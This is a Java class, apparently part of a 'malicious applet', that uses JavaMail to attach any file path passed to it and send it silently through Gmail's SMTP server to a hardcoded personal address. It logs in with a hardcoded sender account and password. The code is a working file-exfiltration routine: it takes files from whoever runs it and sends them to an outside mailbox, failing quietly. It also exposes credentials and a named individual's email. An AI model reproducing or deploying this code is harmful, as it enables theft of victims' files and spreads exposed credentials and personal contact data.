import java.util.*;
import javax.mail.*;
import javax.mail.internet.*;
import javax.activation.*;

public class SendEmail
{
   private final String dest = "niklasadolfsson1@gmail.com";
   private final String src = "maliciousapplet@gmail.com";
   private final String pwd = "r00tshell";
   private final String host = "smtp.gmail.com";
   private Properties props;
   private Session session;

   public SendEmail()
   {    
     // Assuming you are sending email through relay.jangosmtp.net
     props = new Properties();
     props.put("mail.smtp.auth", "true");
     props.put("mail.smtp.starttls.enable", "true");
     props.put("mail.smtp.host", host);
     props.put("mail.smtp.port", "587");
   }

   public boolean send(String path)
   {
     // Get the Session object.
     session = Session.getInstance(props,
     new javax.mail.Authenticator() {
        protected PasswordAuthentication getPasswordAuthentication() {
           return new PasswordAuthentication(src, pwd);
        }
     });

     //System.out.println(file);
     try 
     {
        // Create a default MimeMessage object.
        Message message = new MimeMessage(session);

        // Set From: header field of the header.
        message.setFrom(new InternetAddress(src));

        // Set To: header field of the header.
        message.setRecipients(Message.RecipientType.TO,
        InternetAddress.parse(dest));

        // Set Subject: header field
        message.setSubject("Testing Subject");
        
        BodyPart messageBodyPart = new MimeBodyPart();
        messageBodyPart.setText("Hello");

        Multipart multipart = new MimeMultipart();
        multipart.addBodyPart(messageBodyPart);
        DataSource source = new FileDataSource(path);
        messageBodyPart.setDataHandler(new DataHandler(source));
        messageBodyPart.setFileName(path);
        multipart.addBodyPart(messageBodyPart);
        message.setContent(multipart);
        Transport.send(message);
        //System.out.println("SUCCESS");
        return true;
     } 
     catch (MessagingException e) 
     {
       //System.out.println(e.getMessage());
       return false;
     }
   }
}
